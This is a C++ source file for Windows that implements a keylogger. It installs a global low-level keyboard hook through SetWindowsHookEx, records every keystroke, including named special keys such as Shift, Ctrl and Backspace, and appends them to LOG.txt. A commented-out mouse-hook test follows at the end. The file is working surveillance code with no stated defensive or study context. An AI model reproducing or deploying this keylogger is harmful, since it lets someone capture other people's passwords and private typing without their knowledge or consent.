

    






// --------------------------------------------------------------------------------------------------------------



#define _WIN32_WINNT 0x0500
#include<Windows.h>
#include<stdio.h>

using namespace std;
 
HHOOK hHock = NULL;
const char* file = "LOG.txt";


// Save Pressed Key
#pragma warning (disable : 4996)
void SaveKey(char* key)
{
    FILE* outputFile;      
    outputFile = fopen(file, "a+");
    fprintf(outputFile, "%s", key);
    fclose(outputFile);      
}



// Save Pressed Special Key / Add text for each special key
#pragma warning (disable : 4996)
void SaveSpecialKey(const char* specialKey)
{
    FILE* outputFile;
    outputFile = fopen(file, "a+");
    fprintf(outputFile, specialKey);
    fclose(outputFile);
}

KBDLLHOOKSTRUCT  kbdStruct;
 
// HOOK -----------------------------------------------------------------------------------------------
#pragma warning (disable : 4996)
LRESULT CALLBACK LowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= HC_ACTION) // Checks if wParam and lParam contain valid data or not. If nCode is HC_ACTION (0), then they do, otherwise they do not.
    {

        //PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam); // Contains information about a low-level keyboard input event.

        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        if (kbdStruct.vkCode != 0)
        {

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            //switch (p->vkCode) {
            switch (kbdStruct.vkCode) {

                // Special Keys / Invisible keys
            case VK_CAPITAL:	SaveSpecialKey("<CAPLOCK>");	break;
            case VK_SHIFT:		SaveSpecialKey("<SHIFT>");		break;
            case VK_LCONTROL:	SaveSpecialKey("<LCTRL>");		break;
            case VK_RCONTROL:	SaveSpecialKey("<RCTRL>");		break;
            case VK_INSERT:		SaveSpecialKey("<INSERT>");		break;
            case VK_END:		SaveSpecialKey("<END>");		break;
            case VK_PRINT:		SaveSpecialKey("<PRINT>");		break;
            case VK_DELETE:		SaveSpecialKey("<DEL>");		break;
            case VK_BACK:		SaveSpecialKey("<BK>");			break;
            case VK_RETURN:		SaveSpecialKey("\n");			break;

            case VK_LEFT:		SaveSpecialKey("<LEFT>");		break;
            case VK_RIGHT:		SaveSpecialKey("<RIGHT>");		break;
            case VK_UP:			SaveSpecialKey("<UP>");			break;
            case VK_DOWN:		SaveSpecialKey("<DOWN>");		break;

                // Ordinary keys / Visible keys
            default:
                unsigned char keyboardState[256];
                for (int i = 0; i < 256; ++i)
                    keyboardState[i] = static_cast<unsigned char>(GetKeyState(i));

                wchar_t wbuffer[3] = { 0 };

                int result = ToUnicodeEx(
                    kbdStruct.vkCode,
                    kbdStruct.scanCode,
                    keyboardState,
                    wbuffer,
                    sizeof(wbuffer) / sizeof(wchar_t),
                    0,
                    GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
              
                if (result > 0)
                {
                    char buffer[5] = { 0 };
                    WideCharToMultiByte(CP_UTF8, 0, wbuffer, 1, buffer, sizeof(buffer) / sizeof(char), 0, 0);
                   

                    SaveKey(buffer);

              /*      FILE* outputFile;
                    outputFile = fopen(file, "a+");
                    fprintf(outputFile, "%s", buffer);
                    fclose(outputFile);*/
                    //SaveKey(char(buffer));
                }

               /* SaveKey(char(p->vkCode));*/
            }


         /*   char cc = (p->vkCode);
            const char* gg = &cc;
            printf("%s", gg);*/
        }
        }
    }
    return CallNextHookEx(hHock, nCode, wParam, lParam);
}



int main()
{
    MSG msg;
    hHock = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelHook, NULL, NULL);   // The hook (keyboard hook)
   
    // Listen for msg / listen for keys
    while (!GetMessage(&msg, NULL, NULL, NULL))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHock); // Remove hook before closing tha app
}


















// -------------------------------------------------------------------------------------
//
//#include<Windows.h>
//#include <stdio.h>
//
//
//HHOOK hHock = NULL;
//
//LRESULT CALLBACK MyLowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
//{
//    printf("_a_");
//    return CallNextHookEx(hHock, nCode, wParam, lParam);
//}
//
//int main()
//{
//    MSG msg;
//    hHock = SetWindowsHookEx(WH_MOUSE_LL, MyLowLevelHook, NULL, NULL);
//
//    while (!GetMessage(&msg, NULL, NULL, NULL)) {
//        TranslateMessage(&msg);
//        DispatchMessage(&msg);
//    }
//
//    UnhookWindowsHookEx(hHock);
//}